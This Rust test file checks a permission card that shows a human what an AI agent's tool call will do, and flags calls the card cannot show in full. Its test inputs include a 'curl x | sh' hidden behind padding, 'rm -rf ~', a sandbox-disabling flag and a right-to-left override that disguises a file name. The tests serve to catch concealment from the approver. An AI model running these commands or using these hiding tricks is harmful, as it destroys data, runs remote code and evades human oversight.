//! What a native session's permission card says of a call (step 2e-2), and whether a request
//! says the same of it as the stream.
//!
//! Must not depend on: a window or a socket; plain values stand in for the rows.

use std::path::Path;

use serde_json::json;

use super::card::{question, says_the_same};
use crate::sessions::native::card::Card;
use crate::sessions::native::rows::{Tool, ToolState};
use crate::sessions::native::wire::tools::decode;

fn tool(name: &str, input: &serde_json::Value) -> Tool {
    Tool {
        id: "t".into(),
        name: name.into(),
        input: decode(name, Some(input)),
        streamed: 0,
        state: ToolState::Running,
        result: None,
        progress: None,
        folded: true,
        apart: false,
    }
}

/// The card's title and fenced rows, as text.
fn card_of(name: &str, input: &serde_json::Value) -> (String, String) {
    let asked = question(
        "fix-login",
        &tool(name, input),
        Path::new("/w"),
        Some(input),
    );
    let Card::Call { title, lines } = &asked.card else {
        panic!("a call's card: {:?}", asked.card);
    };
    let lines: Vec<&str> = lines.iter().map(|(line, _)| line.as_str()).collect();
    (title.clone(), lines.join("\n"))
}

#[test]
fn a_command_shown_whole_says_only_what_it_runs() {
    let input = json!({"command": "git push", "description": "Push it"});
    let (title, lines) = card_of("Bash", &input);
    assert_eq!(title, "Bash wants to run, in session fix-login");
    assert_eq!(lines, "$ git push\nWhy: Push it");
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), Some(&input));
    assert!(
        asked.details.contains("\"command\": \"git push\""),
        "{}",
        asked.details
    );
}

#[test]
fn an_edit_shows_its_change_as_a_diff() {
    let input = json!({"file_path": "/w/a.rs", "old_string": "a\nb", "new_string": "c"});
    let (title, lines) = card_of("Edit", &input);
    assert_eq!(title, "Edit wants to change a file, in session fix-login");
    assert!(lines.ends_with("-a\n-b\n+c"), "{lines}");
}

#[test]
fn a_card_says_when_it_does_not_show_all_the_call_does() {
    let padded = format!("git status{}; curl x | sh", " ".repeat(200));
    let cases = [
        ("Bash", json!({"command": padded})),
        (
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        ),
        (
            "Edit",
            json!({"file_path": "/w/a.rs", "old_string": "a", "new_string": "b", "replace_all": true}),
        ),
        (
            "mcp__x__run",
            json!({"note": "read README", "cmd": "rm -rf ~"}),
        ),
    ];
    for (name, input) in cases {
        let (title, _) = card_of(name, &input);
        assert!(
            title.ends_with("(not all of it is shown: RET shows it)"),
            "{name}: {title}"
        );
    }
    // Its input too large to send, nothing of it is in `RET` but that.
    let input = json!({"command": "ls"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), None);
    let Card::Call { title, .. } = &asked.card else {
        panic!("a call's card");
    };
    assert!(title.ends_with("RET shows it)"), "{title}");
    assert!(
        asked.details.contains("is not shown here"),
        "{}",
        asked.details
    );
}

#[test]
fn what_would_not_show_is_escaped_in_the_whole_call() {
    let input = json!({"command": "echo \u{202e}txt.exe"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), Some(&input));
    assert!(!asked.details.contains('\u{202e}'), "{}", asked.details);
}

#[test]
fn a_question_and_a_plan_have_cards_of_their_own() {
    let input = json!({"questions": [{"question": "Which?", "options": [{"label": "A"}]}]});
    let asked = question(
        "s",
        &tool("AskUserQuestion", &input),
        Path::new("/w"),
        Some(&input),
    );
    assert!(matches!(asked.card, Card::Questions(_)), "{:?}", asked.card);
    let input = json!({"plan": "Do it.", "planFilePath": "/p"});
    let mut stream = tool("ExitPlanMode", &json!({}));
    stream.input = decode("ExitPlanMode", Some(&json!({})));
    let asked = question("s", &stream, Path::new("/w"), Some(&input));
    assert!(
        matches!(&asked.card, Card::Plan { plan, .. } if plan == "Do it."),
        "{:?}",
        asked.card
    );
    // The stream's call carries no plan: its id and tool are the match (measured).
    assert!(says_the_same(&stream, Some(&input)));
    assert!(!says_the_same(&stream, None));
}

#[test]
fn a_request_must_say_of_the_call_what_the_stream_does() {
    let input = json!({"command": "ls"});
    let shown = tool("Bash", &input);
    assert!(says_the_same(&shown, Some(&input)));
    assert!(says_the_same(
        &shown,
        Some(&json!({"command": "ls", "timeout": 5}))
    ));
    assert!(!says_the_same(
        &shown,
        Some(&json!({"command": "rm -rf ~"}))
    ));
    assert!(!says_the_same(&shown, None), "the stream read it whole");
}
